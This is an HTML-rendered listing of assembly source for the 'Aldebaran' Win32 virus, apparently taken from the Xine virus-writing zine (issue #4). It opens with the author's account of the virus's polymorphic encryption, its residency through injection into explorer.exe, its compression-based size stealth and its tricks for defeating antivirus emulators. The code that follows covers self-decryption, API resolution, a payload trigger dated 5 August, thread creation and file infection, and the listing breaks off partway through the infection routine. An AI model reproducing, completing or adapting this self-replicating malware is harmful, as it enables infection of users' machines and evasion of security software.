<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>aldebaran.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 203 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The Aldebaran virus - written by T00FiC - poly from Bozo</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                              tanks goes to Ska and Zombie</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus wasn't previewved for xine4, but as old dirty bastard I'm, I </span><span class="sc0">
</span><span class="sc1">; tryed to finish it a bit in hurry. I tested and retested it and it seems to</span><span class="sc0">
</span><span class="sc1">; work. It have a small lack of optimization </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Caracteristic: Win32 Multithread PerProcess/Memory Resident Polymorphic </span><span class="sc0">
</span><span class="sc1">; size-stealth virus (with graphical payload :] )</span><span class="sc0">
</span><span class="sc1">; size about +10 Ko... (I tought to add some mp3 to my virus to beat vecna </span><span class="sc0">
</span><span class="sc1">; viruses size :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Multithread: In order to hide activity to the user, the virus recreate</span><span class="sc0">
</span><span class="sc1">; the original task. And when infecting and when the delicate part of writing</span><span class="sc0">
</span><span class="sc1">; datas to the host come. It stop the other thread, so the user is not able</span><span class="sc0">
</span><span class="sc1">; to close the process until the infection was securely done. The virus also</span><span class="sc0">
</span><span class="sc1">; delay a few seconds before infecting file, to make himself hidden and don't</span><span class="sc0">
</span><span class="sc1">; eat all the machines ressources...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Residency: This is aslo an important point of this virus. On win32 machines,</span><span class="sc0">
</span><span class="sc1">; the virus start, infect 5 file in current directory and 5 file on windows</span><span class="sc0">
</span><span class="sc1">; directory and then stop. But on Windows9x specific machine, the virus is </span><span class="sc0">
</span><span class="sc1">; able to use specific apis used for patching/debugging other process. So</span><span class="sc0">
</span><span class="sc1">; the virus look for explorer.exe loaded in memory. Map the file, detect api</span><span class="sc0">
</span><span class="sc1">; export list and a viable location to put a mini stub loader. So, when </span><span class="sc0">
</span><span class="sc1">; explorer run the SendMessageA api (it does it all the time EXCEPT under dos </span><span class="sc0">
</span><span class="sc1">; boxes), the stub allocate memory and create a thread. This thread is owned</span><span class="sc0">
</span><span class="sc1">; by Explorer.exe. The virus then read memory location and drop over the</span><span class="sc0">
</span><span class="sc1">; explorer memory the virus body. Then the created stub run and init the </span><span class="sc0">
</span><span class="sc1">; memory resident routine. It bascially scan recursively each directory</span><span class="sc0">
</span><span class="sc1">; on fixed disk from C to G (It tryed also to infect my network harddrive :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Polymorphism: Polymorphism was done by Bozo, it was the main idea and </span><span class="sc0">
</span><span class="sc1">; original idea of this virus: Create a small (he was small) virus to use</span><span class="sc0">
</span><span class="sc1">; the bozo poly engine. Now the Polymorphism is used as end user encryption.</span><span class="sc0">
</span><span class="sc1">; It's I think the strongest and much hard to detect encryption loop this </span><span class="sc0">
</span><span class="sc1">; virus have. The poly random is based on the original host compression rate</span><span class="sc0">
</span><span class="sc1">; (I will explain later)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Size stealth: This virus don't use as some poeple call it the 29A</span><span class="sc0">
</span><span class="sc1">; technique (I find saying that's my technique is dork, so I could say ace</span><span class="sc0">
</span><span class="sc1">; archive infection is the IKX technique, that way of finding kernel is IKX</span><span class="sc0">
</span><span class="sc1">; technique blablabla). The virus look if entrypoint point to code (to avoid</span><span class="sc0">
</span><span class="sc1">; binray compressed) then he run over there. Look if there's enough </span><span class="sc0">
</span><span class="sc1">; place in the section, if the distance from the section and the entrypoint</span><span class="sc0">
</span><span class="sc1">; is big enough and then calculate where/how much/what it will have to </span><span class="sc0">
</span><span class="sc1">; compress. Compression use a basic huffman compression done in about 600</span><span class="sc0">
</span><span class="sc1">; byte. So it have to decompress at running, and this take a lot of time and</span><span class="sc0">
</span><span class="sc1">; code are saying saying ? Noooo, it just take 100 byte and 84 milisecond on</span><span class="sc0">
</span><span class="sc1">; my old ready-to-infect P133 computer to decompress. The virus have to </span><span class="sc0">
</span><span class="sc1">; allocate memory, so to this 100 is added 300 or 400 byte for seh handling,</span><span class="sc0">
</span><span class="sc1">; kernel locator, apis finding, priority process manager.</span><span class="sc0">

</span><span class="sc1">; Note: The virus is encrypted in 8 bit without saving the key but it will</span><span class="sc0">
</span><span class="sc1">; have to test each keys, to annoy emulator, the virus allocate huge memory</span><span class="sc0">
</span><span class="sc1">; to drop decompressed datas and run over there his decryption routine. So I</span><span class="sc0">
</span><span class="sc1">; wonder how they will take this virus... Okay, 8 bit suck, avers have just</span><span class="sc0">
</span><span class="sc1">; to test every 8 bit possibility, no that's wrong, they have to test ALL</span><span class="sc0">
</span><span class="sc1">; the algortihm because the key is sliding and changing each loop, (I put</span><span class="sc0">
</span><span class="sc1">; the needed datas to be decrypted on the end of decryption buffer) so they</span><span class="sc0">
</span><span class="sc1">; have to decrypt/reencrypt each time the data. making about 10000 loops on</span><span class="sc0">
</span><span class="sc1">; each keys, good luck guys....</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Second note: look how is stored original enrtypoint: 1st, it's encrypted </span><span class="sc0">
</span><span class="sc1">; without saving the key, secondly, it's compressed with virus in the original</span><span class="sc0">
</span><span class="sc1">; ready to be compressed buffer. Third, it's encrypted using the complex</span><span class="sc0">
</span><span class="sc1">; polymorphic engine of Bozo.I like to read that 3 sentences again and again...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Payload: I wish you will appreciate it</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; There's also some thing to say on this virus. It's a bit based on axelle and</span><span class="sc0">
</span><span class="sc1">; voodoo technologies for base. The main infection concept is based on </span><span class="sc0">
</span><span class="sc1">; old ariannes viruses family using old fashioned write and close apis...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; There's so much to say over this virus, stop blabla, and look code...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Init0</span><span class="sc0">               </span><span class="sc1">; fake virus initialization</span><span class="sc0">

</span><span class="sc5">pseudohost</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10000</span><span class="sc0">               </span><span class="sc1">; you should put it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">               </span><span class="sc1">; let virus time to infect</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc1">; boooooooooooom -(</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdelta</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0"> </span><span class="sc1">; now we have delta</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">RDAE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">RDAE1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">StartCrypt</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartCrypt</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pseudo decryptor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">RDAE2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">99</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">       

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">RDAE2</span><span class="sc0">               </span><span class="sc1">; loop my son, loop...</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'nara'</span><span class="sc0">        </span><span class="sc1">; check for</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RDAE4</span><span class="sc0">                   </span><span class="sc1">; Aldebaran</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartCrypt</span><span class="sc4">],</span><span class="sc12">'xkI0'</span><span class="sc0">       </span><span class="sc1">; check for</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">RDAE5</span><span class="sc0">                                   </span><span class="sc1">; 1st dword</span><span class="sc0">
</span><span class="sc5">RDAE4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">StartCrypt</span><span class="sc0">
</span><span class="sc5">RDAE3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">                   </span><span class="sc1">; reencrypt it</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; if it was </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">99</span><span class="sc0">                   </span><span class="sc1">; wrong</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">RDAE3</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RDAE1</span><span class="sc0">
</span><span class="sc5">StartCrypt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'0Ikx'</span><span class="sc0">

</span><span class="sc5">Restore</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pseudohost</span><span class="sc0">
</span><span class="sc5">backdata</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RDAE5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Init</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; we got it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; now restore host</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pseudofin</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Restore</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; blablabla</span><span class="sc0">
</span><span class="sc5">Init0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">returnapis</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; init apis</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; clear the api return</span><span class="sc0">
                            </span><span class="sc1">; zone, we want fresh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getapis</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; datas</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initapi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnTemp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; </span><span class="sc0">
                            
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; force Load</span><span class="sc0">
                        </span><span class="sc1">; library again later...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc</span><span class="sc0">               </span><span class="sc1">; for compression</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc</span><span class="sc0">               </span><span class="sc1">; double buffer, I </span><span class="sc0">
                            </span><span class="sc1">; like them :P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compressbuffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_Data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetSystemTime</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; check for payload </span><span class="sc0">
                            </span><span class="sc1">; activation ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_Data</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nopayload</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_Data</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">    </span><span class="sc1">; each 5 august </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nopayload</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload</span><span class="sc0">

</span><span class="sc5">nopayload</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnTemp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThread</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; create the other</span><span class="sc0">
                            </span><span class="sc1">; original thread</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ForeignThread</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Residency1</span><span class="sc0">          </span><span class="sc1">; install memory</span><span class="sc0">
                            </span><span class="sc1">; 1st time</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checkflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Goresidency2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThread</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; create forcing 2nd</span><span class="sc0">
                            </span><span class="sc1">; time</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">; go to end</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skipinfect</span><span class="sc0">

</span><span class="sc5">mainbody</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">treeflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stopflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maxinfect</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">countinfect</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">waitscan</span><span class="sc4">],</span><span class="sc2">250</span><span class="sc0">         </span><span class="sc1">; init infection</span><span class="sc0">
                            </span><span class="sc1">; procedure type</span><span class="sc0">
                            </span><span class="sc1">; a bit slow to don't</span><span class="sc0">
                            </span><span class="sc1">; perturb the process</span><span class="sc0">
</span><span class="sc5">Infectdirs</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This routine is the unique residency on winNT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">treeflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">512</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; kill the directory</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Killdir</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; this is dangerous</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; I wont like running</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">512</span><span class="sc0">                     </span><span class="sc1">; this routine</span><span class="sc0">
